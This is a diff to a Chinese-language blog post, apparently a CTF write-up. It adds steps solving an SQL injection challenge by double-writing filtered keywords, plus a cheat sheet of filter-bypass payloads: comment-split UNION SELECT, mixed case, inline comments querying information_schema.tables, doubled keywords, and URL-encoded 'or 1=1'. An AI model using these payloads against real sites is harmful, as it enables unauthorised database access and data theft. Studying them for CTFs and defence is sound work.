@@ -367,10 +367,42 @@
 <li><p>似乎可以，继续查询表信息</p>
 <p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.5.png?raw=true"></p>
 </li>
-<li><p>然后好像还有过滤，都是报错信息中没有显示，继续尝试双写</p>
+<li><p>然后好像还有过滤，都是报错信息中没有显示，继续尝试双写注入</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.6.png?raw=true"></p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.7.png?raw=true"></p>
 </li>
-<li></li>
+<li><p>双写information没用？？？想起来information好像也不是什么关键字，猜测可能是过滤了or</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.8.png?raw=true"></p>
+<p>在or前加的注释语句，然而报错只回显了mation……把or给忽略了，看来是直接过滤了or</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.9.png?raw=true"></p>
+<p>or绕过了，where好像也有过滤</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.10.png?raw=true"></p>
+</li>
+<li><p>查询成功，然后再爆列名和字段名</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.11.png?raw=true"></p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.12.png?raw=true"></p>
+<p>成功获得flag。</p>
+</li>
 </ol>
+</li>
+</ul>
+<ul>
+<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><p>关于sql中的关键字绕过：</p>
+<h4 id="绕过union，select，where等："><a href="#绕过union，select，where等：" class="headerlink" title="绕过union，select，where等："></a>绕过union，select，where等：</h4><h5 id="（1）使用注释符绕过："><a href="#（1）使用注释符绕过：" class="headerlink" title="（1）使用注释符绕过："></a>（1）使用注释符绕过：</h5><p>　　常用注释符：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;，-- , &#x2F;**&#x2F;, #, --+, -- -, ;,%00,--a</span><br></pre></td></tr></table></figure>
+
+<p>　　用法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">U&#x2F;**&#x2F; NION &#x2F;**&#x2F; SE&#x2F;**&#x2F; LECT &#x2F;**&#x2F;user，pwd from user</span><br></pre></td></tr></table></figure>
+
+<h5 id="（2）使用大小写绕过："><a href="#（2）使用大小写绕过：" class="headerlink" title="（2）使用大小写绕过："></a>（2）使用大小写绕过：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39;UnIoN&#x2F;**&#x2F;SeLeCT</span><br></pre></td></tr></table></figure>
+
+<h5 id="（3）内联注释绕过："><a href="#（3）内联注释绕过：" class="headerlink" title="（3）内联注释绕过："></a>（3）内联注释绕过：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39;&#x2F;*!UnIoN*&#x2F; SeLeCT 1,2,concat(&#x2F;*!table_name*&#x2F;) FrOM &#x2F;*information_schema*&#x2F;.tables &#x2F;*!WHERE *&#x2F;&#x2F;*!TaBlE_ScHeMa*&#x2F; like database()#</span><br></pre></td></tr></table></figure>
+
+<h5 id="（4）-双关键字绕过（若删除掉第一个匹配的union就能绕过）："><a href="#（4）-双关键字绕过（若删除掉第一个匹配的union就能绕过）：" class="headerlink" title="（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）："></a>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure>
+
+<h5 id="通用绕过（编码）："><a href="#通用绕过（编码）：" class="headerlink" title="通用绕过（编码）："></a>通用绕过（编码）：</h5><p>　　如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br></pre></td></tr></table></figure>
+
 </li>
 </ul>
 ]]></content>
